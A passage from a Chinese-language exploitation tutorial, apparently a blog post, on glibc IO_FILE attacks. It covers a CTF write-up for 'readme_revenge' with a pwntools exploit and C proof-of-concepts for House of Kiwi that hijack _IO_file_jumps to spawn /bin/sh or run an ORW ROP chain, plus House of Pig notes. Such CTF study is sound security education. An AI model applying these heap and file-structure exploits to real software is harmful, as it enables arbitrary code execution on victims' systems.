                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113820842.png"
                      alt="image-20231024113820842"
                ></p>
<h3 id="逆向分析-3"><a href="#逆向分析-3" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A0D                               ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000400A0D                               public main</span><br><span class="line">.text:0000000000400A0D                               main proc near                          ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:0000000000400A0D</span><br><span class="line">.text:0000000000400A0D                               var_1020= qword ptr -1020h</span><br><span class="line">.text:0000000000400A0D</span><br><span class="line">.text:0000000000400A0D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000400A0D 55                            push    rbp</span><br><span class="line">.text:0000000000400A0E 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000400A11 48 8D A4 24 E0 EF FF FF       lea     rsp, [rsp-1020h]</span><br><span class="line">.text:0000000000400A19 48 83 0C 24 00                or      [rsp+1020h+var_1020], 0</span><br><span class="line">.text:0000000000400A1E 48 8D A4 24 20 10 00 00       lea     rsp, [rsp+1020h]</span><br><span class="line">.text:0000000000400A26 48 8D 35 B3 69 2B 00          lea     rsi, name</span><br><span class="line">.text:0000000000400A2D 48 8D 3D 50 C7 08 00          lea     rdi, unk_48D184	;%s</span><br><span class="line">.text:0000000000400A34 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A39 E8 22 71 00 00                call    __isoc99_scanf</span><br><span class="line">.text:0000000000400A39</span><br><span class="line">.text:0000000000400A3E 48 8D 35 9B 69 2B 00          lea     rsi, name</span><br><span class="line">.text:0000000000400A45 48 8D 3D 3B C7 08 00          lea     rdi, aHiSBye                    ; &quot;Hi, %s. Bye.\n&quot;</span><br><span class="line">.text:0000000000400A4C B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A51 E8 7A 6F 00 00                call    printf</span><br><span class="line">.text:0000000000400A51</span><br><span class="line">.text:0000000000400A56 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000400A5B 5D                            pop     rbp</span><br><span class="line">.text:0000000000400A5C C3                            retn</span><br><span class="line">.text:0000000000400A5C                               ; &#125; // starts at 400A0D</span><br><span class="line">.text:0000000000400A5C</span><br><span class="line">.text:0000000000400A5C                               main endp</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024114633005.png"
                      alt="image-20231024114633005"
                ></p>
<p>存在缓冲区漏洞，向 <code>.bss</code> 节的 <code>name</code> 变量写入内容，然后打印它。并且 <code>flag</code> 位于 <code>.data</code> 节，可以利用 <code>__stack_chk_fail()</code> 将其打印出来。</p>
<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用缓冲区溢出篡改 <code>__printf_function_table</code> 指向一个非零值，因为 <code>%s</code> 的 <code>ascii</code> 是 <code>0x73</code>，所以让 <code>__printf_arginfo_table</code> 指向 <code>fake_arginfo_table[0x73*8] == __stack_chk_fail()</code>，将 <code>argv[0]</code> 改为 <code>flag</code> 地址。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115056364.png"
                      alt="image-20231024115056364"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115137320.png"
                      alt="image-20231024115137320"
                ></p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./readme_revenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x6b4040</span></span><br><span class="line">name_addr = <span class="number">0x6b73e0</span></span><br><span class="line">argv_addr = <span class="number">0x6b7980</span></span><br><span class="line">func_table = <span class="number">0x6b7a28</span></span><br><span class="line">arginfo_table = <span class="number">0x6b7aa8</span></span><br><span class="line"></span><br><span class="line">stack_chk_fail = <span class="number">0x4359b0</span></span><br><span class="line"></span><br><span class="line">payload  = p64(flag_addr)       <span class="comment"># name</span></span><br><span class="line">payload  = payload.ljust(<span class="number">0x73</span> * <span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(stack_chk_fail)  <span class="comment"># __printf_arginfo_table[spec-&gt;info.spec]</span></span><br><span class="line">payload  = payload.ljust(argv_addr - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># argv</span></span><br><span class="line">payload  = payload.ljust(func_table - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># __printf_function_table</span></span><br><span class="line">payload  = payload.ljust(arginfo_table - name_addr, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(name_addr)       <span class="comment"># __printf_arginfo_table</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&#x27;b *0x400A4C&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024115210102.png"
                      alt="image-20231024115210102"
                ></p>
<h1 id="House-of-Kiwi"><a href="#House-of-Kiwi" class="headerlink" title="House of Kiwi"></a>House of Kiwi</h1><p><code>glibc &lt; 2.36</code>，这里有一点需要注意，高版本的 <code>glibc</code> 的 <code>_IO_file_jumps</code> 有的是不可写的，所以可以通过 <code>vmmap</code> 来查看此段是否具有可写权限。可以通过 <code>mprotect((void*)(libc_base + 0x215000), 0x2000, PROT_READ | PROT_WRITE);</code> 改写其权限。</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>有如下调用链:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> assert(expr) ((void) 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> assert(expr) \</span></span><br><span class="line"><span class="meta">  ((expr)								      \</span></span><br><span class="line"><span class="meta">   ? ((void) 0)								      \</span></span><br><span class="line"><span class="meta">   : __malloc_assert (#expr, __FILE__, __LINE__, __func__))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p><em>tips:通过<code>large bin chunk</code>的<code>size</code>中<code>flag</code>位修改,或者<code>top chunk</code>的<code>inuse</code>写<code>0</code>等方法可以触发<code>assert</code></em></p>
<p>当我们触发 <code>assert</code> 断言时会调用 <code>__malloc_assert</code>，<code>__malloc_assert</code> 里有这样一条调用链：<code>fflush-&gt;_IO_fflush</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      <span class="built_in">CHECK_FILE</span> (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行到 <code>result = _IO_SYNC (fp) ? EOF : 0;</code> 时，会调用 <code>_IO_new_file_sync</code>， <code>_IO_file_jumps_</code> 可写。因此将 <code>_IO_file_jumps_</code> 对应 <code>_IO_new_file_sync</code> 函数指针的位置覆盖为 <code>one_gadget</code> 就可以获取 <code>shell</code> 。</p>
<p>利用前提：</p>
<ol>
<li>能够触发 <code>__malloc_assert</code>。</li>
<li>能够申请到 <code>_IO_file_sync</code> 和 <code>_IO_helper_jumps</code> 这两个位置并且修改。</li>
</ol>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>未开沙箱 poc</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = &amp;getshell;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231025114705128.png"
                      alt="image-20231025114705128"
                ></p>
<p><strong>开了沙箱禁用 execve</strong></p>
<p>对于禁用 <code>execve</code> 的程序需要借助 <code>(setcontext+61) + rop</code> 或 <code>shellcode</code> 进行 <code>orw</code> 。<code>glibc 2.29</code>之后 <code>setcontext</code>中的 <code>gadget</code>变成了以 <code>rdx </code>索引，因此还要先通过 <code>ROP</code>控制 <code>RDX</code>的值。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; setcontext+61</span><br><span class="line">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:00000000000580E4                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:00000000000580EB                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:00000000000580EF                 mov     r12, [rdx+48h]</span><br><span class="line">.text:00000000000580F3                 mov     r13, [rdx+50h]</span><br><span class="line">.text:00000000000580F7                 mov     r14, [rdx+58h]</span><br><span class="line">.text:00000000000580FB                 mov     r15, [rdx+60h]</span><br><span class="line">.text:00000000000580FF                 test    dword ptr fs:48h, 2</span><br><span class="line">    ....</span><br><span class="line">.text:00000000000581C6                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:00000000000581CD                 push    rcx</span><br><span class="line">.text:00000000000581CE                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:00000000000581D2                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:00000000000581D6                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:00000000000581DD                 mov     r8, [rdx+28h]</span><br><span class="line">.text:00000000000581E1                 mov     r9, [rdx+30h]</span><br><span class="line">.text:00000000000581E5                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:00000000000581EC                 xor     eax, eax</span><br><span class="line">.text:00000000000581EE                 retn</span><br></pre></td></tr></table></figure></div>

<p><em>tips:注意，内存中有不止一个  <code>_IO_helper_jumps_</code> ，具体是哪一个要通过调试确定</em></p>
<p>调用 <code>_IO_new_file_sync</code> 时 <code>rdx</code> 指向的是 <code>_IO_helper_jumps_</code> 结构，该结构同样可写。因此可以通过修改 <code>_IO_helper_jumps_</code> 中的内容来给寄存器赋值。还需要设置 <code>rsp</code> 指向提前布置好的 <code>rop</code> 的起始位置，同时设置 <code>rip</code> 指向 <code>ret</code> 指令。最后劫持程序流实现 <code>orw</code> 。</p>
<p>总体利用思路如下:</p>
<ul>
<li>利用 <code>large bin attack</code> 改位于 <code>_IO_file_jumps</code> 中的<code>_IO_file_sync</code>指针为 <code>setcontext + 61</code></li>
<li>修改<code>IO_helper_jumps + 0xA0</code> 和 <code>IO_helper_jumps + 0xA8 </code>分别为可迁移的存放有 <code>rop</code> 的位置和 <code>ret</code> 指令或者 <code>rop</code> 首个指令地址的位置,则可以进行栈迁移</li>
</ul>
<p><strong>poc</strong></p>
<p>来自 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_kiwi" >_sky123_老师 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x2da82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x107191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x37bba</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x446d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x88236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x7a4e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x50bd0</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_helper_jumps = libc_base + <span class="number">0x1f3980</span>; <span class="comment">// _IO_helper_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x1f45e0</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line">	<span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA0</span>/<span class="number">8</span>) = (<span class="type">size_t</span>)ROP; </span><br><span class="line">    <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; </span><br><span class="line"> 	<span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = magic_gadget;</span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中</span></span><br><span class="line">    <span class="comment">// 其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231025114912932.png"
                      alt="image-20231025114912932"
                ></p>
<p><strong>glibc-2.36 的执行流</strong></p>
<p><code>glibc-2.36</code> 的 <code>__malloc_assert</code> 发生重大改变，直接通过系统调用不走 <code>IO</code>，该方法失效。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_Noreturn <span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  __libc_message (do_abort, <span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fatal glibc error: malloc assertion failure in %s: %s\n&quot;</span>,</span><br><span class="line">		  function, assertion);</span><br><span class="line">  __builtin_unreachable ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-pig"><a href="#House-of-pig" class="headerlink" title="House of pig"></a>House of pig</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>再来看一下 <code>_IO_str_overflow</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 覆盖到这里</span></span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 调用malloc</span></span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);<span class="comment">// 调用memecpy，覆盖</span></span><br><span class="line">	      <span class="built_in">free</span> (old_buf); <span class="comment">// 调用free</span></span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line">      ...</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>利用流程如下：</p>
<ul>
<li>将<code>_IO_buf_base</code> 指向 <code>/bin/sh\x00</code> 地址。</li>
<li>控制<code>_IO_buf_end-_IO_buf_base</code> 的值也就是 <code>new_size</code> 的值，进而控制分配的 <code>chunk</code> 的大小，分配到布局好的地址。</li>
<li>利用 <code>memcpy</code> 中覆盖地址，也就是 <code>malloc</code> 出来的 <code>new_buf</code>， 可以覆盖<code>__malloc_hook/__free_hook</code> 等</li>
<li>最后调用 <code>free(old_buf) -&gt; system(&quot;/bin/sh&quot;)</code>，</li>
</ul>
<p>在 <code>glibc-2.34</code> 后 <code>ptmalloc</code> 取消了各种 <code>hook</code>，但依然可以用 <code>house of pig</code> 实现任意地址写任意值，借助其他手段完成权限获取，后面有时间会做补充。</p>
<p><code>House of Pig</code> 是一个将 <code>Tcache Statsh Unlink Attack</code> 和 <code>FSOP</code> 结合的攻击，同时使用到了 <code>Largebin Attack</code> 进行辅助。主要适用于 <code>libc 2.31</code> 及以后的新版本 <code>libc</code> 并且程序中仅有 <code>calloc</code> 时。</p>
<p>利用条件为：</p>
<ul>
<li>存在 <code>UAF</code></li>
<li>能执行 <code>abort</code> 流程或程序显式调用 <code>exit</code> 或程序能通过主函数返回。</li>
</ul>
